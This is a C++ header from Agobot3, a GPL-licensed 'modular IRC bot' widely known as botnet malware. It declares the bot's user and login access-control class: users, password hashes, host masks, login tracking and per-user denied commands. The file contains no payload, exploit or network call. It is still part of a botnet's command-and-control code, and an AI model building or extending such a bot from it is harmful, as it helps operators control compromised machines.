/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __MAC_H__
#define __MAC_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"

using namespace std;

// Params: a=user, b=md5, c=netmask, d=identd
#define ADDUSER(a, b, c, d) g_pMainCtrl->m_cMac.AddUser(a, b, c, d);

class CCommandHandler;

typedef struct func_s
{
	CString		 sFuncname;		// Function name
} func;

typedef struct user_s
{
	CString		 sUsername;		// Username
	CString		 sPassword;		// Password
	CString		 sHost;			// Host
	CString		 sIdentd;		// Identd
	list<func*>	 lDeny;			// Functions to deny

} user;

typedef struct login_s
{
	user		*pUser;			// Pointer to the user of this login
	CString		 sUsername;		// Username
	CString		 sIRCUsername;	// Username in IRC
	CString		 sHost;			// Host
	CString		 sIdentd;		// Identd
} login;

class CMac : public CCommandHandler
{
public:
	CMac();
	virtual ~CMac();
	void Init();

	login *FindLogin(CString sIRCUsername);
	login *FindLogin(char *szIRCUsername);

	bool CheckBadFunc(CString sFuncname, CString sUsername);
	bool CheckBadFunc(char *szFuncname, char *szUsername);

	bool AddLogin(CString sUsername, CString sPassword, CString sIRCUsername, CString sHost, CString sIdentd);
	bool AddLogin(char *szUsername, char *szPassword, char *szIRCUsername, char *szHost, char *szIdentd);
	void ClearLogins();

	bool DelLogin(CString sUsername, CString sIRCUsername);
	bool DelLogin(char *szUsername, char *szIRCUsername);

	void AddBadFunc(CString sFuncname, user *pUser);
	void AddBadFunc(char *szFuncname, user *pUser);

	void AddUser(CString sUsername, CString sPassword, CString sHost, CString sIdentd);
	void AddUser(char *szUsername, char *szPassword, char *szHost, char *szIdentd);

	bool HandleCommand(CMessage *pMsg);
	command m_cmdLogin, m_cmdLogout;
protected:
	bool DelBadFunc(CString sFuncname, user *pUser);
	bool DelBadFunc_int(CString sFuncname, user *pUser);
	bool DelUser(CString sUsername);
	bool CheckPassword(CString sPassword, user *pUser);
	func *FindFunc(CString sFuncname, list<func*> lStart);
	user *FindUser(CString sUsername);
private:
	list<user*> luStart;
	list<login*> llStart;
};

#endif // __MAC_H__
